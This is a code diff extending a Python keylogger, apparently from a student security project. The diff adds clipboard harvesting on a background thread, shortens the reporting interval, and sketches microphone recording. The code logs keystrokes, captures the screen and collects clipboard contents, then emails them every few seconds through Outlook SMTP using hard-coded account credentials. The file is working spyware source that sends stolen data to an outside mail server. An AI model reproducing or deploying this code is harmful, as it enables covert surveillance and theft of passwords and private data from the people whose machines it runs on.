@@ -1,7 +1,10 @@
 import keyboard
 import smtplib # SMTP (Simple Mail Tranfer Protocol)
 import os
-from threading import Timer
+import pyperclip
+import sounddevice
+from scipy.io.wavfile import write
+from threading import Timer, Thread
 from datetime import datetime
 from os.path import basename
 from PIL import ImageGrab
@@ -10,7 +13,7 @@ from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 
 #PARAMATERS
-INTERVAL = 60 # in seconds, 60 means 1 minute and so on
+INTERVAL = 20 # in seconds, 60 means 1 minute and so on
 EMAIL_ADDRESS = "SomethingAwesome6441@outlook.com"
 EMAIL_PASSWORD = "ThisIsAStrongPassword"
 
@@ -24,6 +27,8 @@ class Keylogger:
         self.log = ""
         # list of all attachments
         self.attachments = []
+        # list of clipboard history
+        self.clipboard_history = []
         # record start & end datetimes
         self.start_dt = datetime.now()
         self.end_dt = datetime.now()
@@ -60,7 +65,7 @@ class Keylogger:
     Return:
     - returns the formatted email as a string
     '''
-    def prepare_email(self, message, files=None):
+    def prepare_email(self, message, files, clipboard):
         # create mail
         email = MIMEMultipart("alternative")
         email["From"] = EMAIL_ADDRESS
@@ -69,9 +74,15 @@ class Keylogger:
         
         # create message (text and html versions)
         text = MIMEText(message, "plain")
-        html = MIMEText(f"<p><b>{message}</b></p>", "html")
+        html = MIMEText(f"<h2><b>Key Log:</b></h2><p>{message}</p>", "html")
         email.attach(text)
         email.attach(html)
+        # create a file with current clipboards
+        if clipboard:
+            with open("file_attachments/clipboard.txt", "w") as clipboard_file:
+                for clip in clipboard:
+                    clipboard_file.write(f"{clip}\n")
+            files.append("file_attachments/clipboard.txt")
         
         # add file attachments to email
         for file in files:
@@ -94,7 +105,7 @@ class Keylogger:
     Return:
     - returns the formatted email as a string
     '''
-    def send_email(self, email, password, message, files, verbose=1):
+    def send_email(self, email, password, message, files, clipboard, verbose=1):
         # manages a connection to an SMTP server (for Microsoft365, Outlook, Hotmail, and live.com)
         server = smtplib.SMTP(host="smtp.office365.com", port=587)
         # connect to the SMTP server as TLS mode ( for security )
@@ -102,7 +113,7 @@ class Keylogger:
         # login to email account
         server.login(email, password)
         # send email
-        server.sendmail(email, email, self.prepare_email(message, files))
+        server.sendmail(email, email, self.prepare_email(message, files, clipboard))
         # terminates the session
         server.quit()
         if verbose:
@@ -110,11 +121,11 @@ class Keylogger:
 
     def report(self):
         # report log if there is something in the log
-        if self.log or self.attachments:
+        if self.log or self.attachments or self.clipboard_history:
             self.end_dt = datetime.now()
             # self.update_filename()
             # if self.report_method == "email":
-            self.send_email(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log, self.attachments)
+            self.send_email(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log, self.attachments, self.clipboard_history)
             # elif self.report_method == "file":
             #     self.report_to_file()
             # if you don't want to print in the console, comment below line
@@ -123,6 +134,7 @@ class Keylogger:
             #reset log and attachments
             self.log = ""
             self.attachments = []
+            self.clipboard_history = []
         timer = Timer(interval=self.interval, function=self.report)
         # set the thread as daemon (dies when main thread die)
         timer.daemon = True
@@ -150,17 +162,33 @@ class Keylogger:
         # start the timer
         timer.start()
     
-
+    def copy_clipboard(self):
+        while True:
+            self.clipboard_history.append(pyperclip.waitForNewPaste())
+        # if self.clipboard_history == [] or pyperclip.paste() != self.clipboard_history[-1]:
+    
+    # def record_microphone(self):
+    #     # Sampling frequency
+    #     freq = 44100
+    #     # Recording duration
+    #     duration = 10
+    #     recording = sounddevice.rec(int(duration * freq), samplerate=freq, channels=2)
+    #     sounddevice.wait(f"")
 
     def start(self):
         # record the start datetime
         self.start_dt = datetime.now()
         # start the keylogger
         keyboard.on_release(self.update_log)
-        # start capturing the screen
-        self.capture_img()
         # start reporting the keylogs
         self.report()
+        # start capturing clipboard
+        clipboard_thread = Thread(target=self.copy_clipboard)
+        clipboard_thread.daemon = True
+        clipboard_thread.start()
+        # start capturing the screen
+        self.capture_img()
+
         # make a simple message
         print(f"{datetime.now()} - Started keylogger")
         # block the current thread, wait until CTRL+C is pressed
